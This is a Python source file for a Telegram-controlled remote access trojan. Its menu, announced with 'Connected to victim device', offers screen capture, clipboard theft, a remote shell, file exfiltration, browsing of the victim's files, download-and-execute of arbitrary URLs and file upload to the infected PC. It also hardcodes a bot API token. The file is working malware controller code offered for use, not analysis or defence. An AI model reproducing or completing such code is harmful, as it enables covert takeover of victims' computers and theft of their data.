import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, MessageHandler,
    ContextTypes, filters
)

from features import (
    explorer, persistence, processes, downloader, upload
)

API_KEY = "7189551044:AAGZQLo4ThFWKtSzpX0QFxm6uIEuL1Oc0mw"
CHAT_ID = 7696515355  # Replace with your chat ID

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🖥 Screenshot", callback_data="screenshot")],
        [InlineKeyboardButton("📋 Clipboard", callback_data="clipboard")],
        [InlineKeyboardButton("💻 Shell", callback_data="shell")],
        [InlineKeyboardButton("📂 Get File", callback_data="getfile")],
        [InlineKeyboardButton("🗂 File Explorer", callback_data="fileexplorer")],
        [InlineKeyboardButton("📋 Processes", callback_data="processes")],
        [InlineKeyboardButton("⬇️ Download+Run", callback_data="downexec")],
        [InlineKeyboardButton("📤 Upload to PC", callback_data="uploadfile")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("✅ Connected to victim device.", reply_markup=reply_markup)

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    cmd = query.data

    if cmd == "screenshot":
        await explorer.send_screenshot(context, CHAT_ID)
    elif cmd == "clipboard":
        await explorer.send_clipboard(context, CHAT_ID)
    elif cmd == "shell":
        await query.edit_message_text("💻 Send shell command:")
        context.user_data["expecting_shell"] = True
    elif cmd == "getfile":
        await query.edit_message_text("📂 Send full file path:")
        context.user_data["expecting_file"] = True
    elif cmd == "fileexplorer":
        await query.edit_message_text("📁 Send path to explore:")
        context.user_data["expecting_explorer"] = True
    elif cmd == "processes":
        await processes.handle_process_list(context, CHAT_ID)
    elif cmd == "downexec":
        await query.edit_message_text("⬇️ Send URL to download & run:")
        context.user_data["expecting_download"] = True
    elif cmd == "uploadfile":
        await query.edit_message_text("📤 Send file to upload to PC.")
        context.user_data["expecting_upload"] = True

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if context.user_data.get("expecting_shell"):
        context.user_data["expecting_shell"] = False
        await explorer.run_shell(update, context, text)
    elif context.user_data.get("expecting_file"):
        context.user_data["expecting_file"] = False
        await explorer.send_file(update, context, text)
    elif context.user_data.get("expecting_explorer"):
        context.user_data["expecting_explorer"] = False
        await explorer.explore_path(update, context, text)
    elif context.user_data.get("expecting_download"):
        context.user_data["expecting_download"] = False
        await downloader.download_and_execute(update, context, text)
    elif context.user_data.get("expecting_upload"):
        context.user_data["expecting_upload"] = False
        await upload.handle_upload(update, context)
    else:
        await update.message.reply_text("⚠️ Use the provided menu buttons.")

async def main():
    app = Application.builder().token(API_KEY).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, upload.handle_file_receive))

    print("[BOT] Ready. Listening for commands...")
    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    while True:
        await asyncio.sleep(1)

if __name__ == "__main__":
    asyncio.run(main())
